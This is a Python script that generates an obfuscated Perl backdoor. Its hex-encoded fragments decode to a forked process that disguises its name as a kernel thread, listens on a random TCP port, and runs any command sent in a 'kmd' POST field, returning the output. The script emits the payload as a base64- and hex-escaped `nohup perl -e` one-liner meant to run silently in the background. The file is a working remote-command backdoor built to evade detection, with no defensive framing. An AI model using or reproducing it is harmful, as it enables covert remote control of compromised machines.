#!/usr/bin/python3.6
import binascii
import os
import sys
import random
import base64

def hexToASCII(hexx):
	# initialize the ASCII code string as empty.
	ascii = ""
	for i in range(0, len(hexx), 2):
		# extract two characters from hex string
		part = hexx[i : i + 2]
		# change it into base 16 and
		# typecast as the character
		ch = chr(int(part, 16))
		# add this char to final ASCII string
		ascii += ch
	return ascii

if __name__ == "__main__":
	header = ['cpuhphp/0','cpuhphp/1','cpuhphp/10','cpuhphp/2','cpuhphp/3','cpuhphp/4','cpuhphp/5','cpuhphp/6','cpuhphp/7','cpuhphp/8','cpuhphp/9','idle_injector/0','idle_injector/1','idle_injector/10','idle_injector/2','idle_injector/3','idle_injector/4','idle_injector/5','idle_injector/6','idle_injector/7','idle_injector/8','idle_injector/9','ksoftirqds/0','ksoftirqds/1','ksoftirqds/10','ksoftirqds/2','ksoftirqds/3','ksoftirqds/4','ksoftirqds/5','ksoftirqds/6','ksoftirqds/7','ksoftirqds/8','ksoftirqds/9','kworkers/0:0H-events_highpri','kworkers/1:0H-kblockd','kworkers/2:0H-kblockd','kworkers/3:0H-events_highpri','kworkers/4:0H-events_highpri','kworkers/5:0H-kblockd','kworkers/6:0H-events_highpri','kworkers/7:0H-events_highpri','kworkers/8:0H-events_highpri','kworkers/9:0H-events_highpri','migrations/0','migrations/1','migrations/10','migrations/2','migrations/3','migrations/4','migrations/5','migrations/6','migrations/7','migrations/8','migrations/9','mm_percpus_wq','rcuset_gp','rcuset_par_gp','rcuset_scheds']


	primero = "757365207374726963743b75736520536f636b65743b75736520494f3a3a536f636b65743b6d7920247069643d666f726b28293b6578697420696620247069643b24303d275b"
	segundo = "5d273b7375622070617273655f666f726d207b6d79202464617461203d20245f5b305d3b6d792025646174613b666f7265616368202873706c6974202f262f2c20246461746129207b6d792028246b65792c202476616c29203d2073706c6974202f3d2f3b2476616c203d7e20732f5c2b2f202f673b2476616c203d7e20732f25282e2e292f6368722868657828243129292f65673b24646174617b246b65797d203d202476616c3b69662028246b6579203d3d20226b6d6422297b6d792040636f6465203d20602476616c20323e202f6465762f7374646f7574603b24646174617b226f7574707574227d203d206a6f696e2827272c40636f6465293b7d7d72657475726e2025646174613b207d6d792024706f7274203d20"
	tercero = "203b6d792024736572766572203d206e657720494f3a3a536f636b65743a3a494e45542850726f746f203d3e2027746370272c4c6f63616c506f7274203d3e2024706f72742c4c697374656e203d3e20534f4d4158434f4e4e2c5265757365203d3e2031293b7768696c6520286d792024636c69656e74203d20247365727665722d3e616363657074282929207b24636c69656e742d3e6175746f666c7573682831293b6d79202572657175657374203d2028293b6d792025646174613b7b6c6f63616c20242f203d20536f636b65743a3a43524c463b7768696c6520283c24636c69656e743e29207b63686f6d703b696620282f5c732a285c772b295c732a285b5e5c735d2b295c732a485454505c2f285c642e5c64292f297b24726571756573747b4d4554484f447d203d2075632024313b24726571756573747b55524c7d203d2024323b24726571756573747b485454505f56455253494f4e7d203d2024333b7d656c73696620282f3a2f297b286d792024747970652c206d79202476616c29203d2073706c6974202f3a2f2c20245f2c20323b2474797065203d7e20732f5e5c732b2f2f3b666f7265616368202824747970652c202476616c29207b20732f5e5c732b2f2f3b20732f5c732b242f2f3b7d24726571756573747b6c632024747970657d203d202476616c3b7d656c73696620282f5e242f29207b726561642824636c69656e742c2024726571756573747b434f4e54454e547d2c2024726571756573747b27636f6e74656e742d6c656e677468277d29696620646566696e65642024726571756573747b27636f6e74656e742d6c656e677468277d3b6c6173743b7d7d7d6966202824726571756573747b4d4554484f447d2065712027504f535427297b2564617461203d2070617273655f666f726d2824726571756573747b434f4e54454e547d293b7072696e742024636c69656e742022485454502f312e3020323030204f4b222c20536f636b65743a3a43524c463b7072696e742024636c69656e742022436f6e74656e742d547970653a20746578742f706c61696e222c20536f636b65743a3a43524c463b7072696e742024636c69656e7420536f636b65743a3a43524c463b7072696e742024636c69656e742024646174617b6f75747075747d3b7d636c6f73652024636c69656e743b7d"
	
	port = random.randint(28000, 65535)
	porthex = str(port).strip().encode("utf-8").hex()
	randomheader = random.choice(header)
	randomheaderhex = randomheader.strip().encode("utf-8").hex()
	print("\nPort: " + str(port) + "\nService: " + randomheader + "\n")
	hextext = primero + randomheaderhex + segundo + porthex + tercero
	hexdecode = hexToASCII(hextext)
	textascii = hexdecode.encode('ascii')
	base64_bytes = base64.b64encode(textascii)
	base64_message = base64_bytes.decode('ascii')
	print("\n"+base64_message+"\n")
	#asciitext = str.encode(hexdecode).encode('utf-8')
	cuarto = hexToASCII("7065726c202d652027757365204d494d453a3a4261736536343b6576616c286465636f64655f6261736536342822")

	quinto = hexToASCII("2229293b27")

	final1 = cuarto + base64_message + quinto
	finalhex = binascii.hexlify(final1.encode('ascii')).decode('ascii')
	
	sexto = hexToASCII("6e6f687570207065726c202d65202773797374656d28225c780")
	septimo = hexToASCII("222927203e202f6465762f6e756c6c20260a")

	print(sexto + '\\x'.join(finalhex[i:i+2] for i in range(0, len(finalhex), 2)) + septimo)
